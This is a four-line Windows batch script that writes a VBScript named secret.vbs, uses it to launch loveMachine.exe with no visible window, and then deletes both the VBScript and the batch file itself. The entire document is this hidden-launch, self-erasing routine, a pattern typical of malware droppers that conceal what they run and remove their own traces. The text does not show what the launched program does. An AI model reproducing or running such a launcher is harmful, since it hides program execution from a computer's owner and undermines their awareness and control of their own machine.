echo CreateObject(^"Wscript.Shell^").Run ^"^"^"^" ^& WScript.Arguments(0) ^& ^"^"^"^", 0, False > secret.vbs
Wscript secret.vbs loveMachine.exe
del secret.vbs
del start.bat